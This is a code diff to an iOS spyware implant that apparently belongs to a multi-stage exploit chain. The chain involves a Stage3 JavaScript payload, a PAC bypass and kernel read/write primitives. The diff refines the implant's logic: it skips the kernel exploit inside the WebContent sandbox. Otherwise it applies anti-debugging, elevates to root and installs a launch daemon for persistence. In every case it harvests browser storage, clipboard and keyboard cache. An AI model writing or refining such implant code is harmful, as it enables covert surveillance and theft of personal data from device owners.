@@ -119,35 +119,45 @@ static void *implant_main(void *arg) {
      *     ICMP sockets that the WebContent sandbox blocks.
      *
      *  2. coruna_hook_slot — Stage3_VariantB.js can write real kernel VAs here
-     *     before calling _process.  Valid in all environments.
+     *     before calling _process.  Valid ONLY outside WebContent.
+     *
+     *     CRITICAL: iOS 16.5+ memory layout differs from 16.3; the kread/kwrite
+     *     function pointers produced by Stage3's PAC bypass for 16.5 may be
+     *     incorrect.  Calling kread64() with a bad function pointer inside
+     *     WebContent triggers SIGSEGV → SIGKILL the entire process, preventing
+     *     any data from being collected.  Since MAC sandbox labels block kernel-
+     *     level privilege operations in WebContent anyway, there is zero benefit
+     *     to using these primitives here.  Skip entirely in WebContent.
      *
      *  If both paths fail we degrade gracefully and harvest whatever the current
      *  sandbox permissions allow (WebKit storage, clipboard, keyboard cache, …).
      */
     const bool in_webcontent = is_webcontent_process();
 
-    /* Path 1: self-bootstrapping kernel exploit (skip in WebContent) */
-    if (!in_webcontent && !kernel_base())
-        ke_run();
+    if (!in_webcontent) {
+        /* Path 1: self-bootstrapping kernel exploit (non-WebContent only) */
+        if (!kernel_base())
+            ke_run();
 
-    /* Path 2: wait for Stage3 to populate hook_slot (max ~5 s) */
-    for (int i = 0; i < 50 && !kernel_base(); i++) {
-        volatile uint64_t magic = coruna_hook_slot[3];
-        if (magic == (uint64_t)CORUNA_HOOK_MAGIC) {
-            coruna_init_primitives_from_addrs(
-                (uint64_t)coruna_hook_slot[0],
-                (uint64_t)coruna_hook_slot[1],
-                (uint64_t)coruna_hook_slot[2]);
-            coruna_hook_slot[3] = 0;
-            break;
+        /* Path 2: wait for Stage3 to populate hook_slot (max ~5 s) */
+        for (int i = 0; i < 50 && !kernel_base(); i++) {
+            volatile uint64_t magic = coruna_hook_slot[3];
+            if (magic == (uint64_t)CORUNA_HOOK_MAGIC) {
+                coruna_init_primitives_from_addrs(
+                    (uint64_t)coruna_hook_slot[0],
+                    (uint64_t)coruna_hook_slot[1],
+                    (uint64_t)coruna_hook_slot[2]);
+                coruna_hook_slot[3] = 0;
+                break;
+            }
+            usleep(100000);
         }
-        usleep(100000);
-    }
 
-    if (kernel_base()) {
-        apply_anti_debug();
-        elevate_to_root();
-        install_launchdaemon();
+        if (kernel_base()) {
+            apply_anti_debug();
+            elevate_to_root();
+            install_launchdaemon();
+        }
     }
 
     harvest_all();
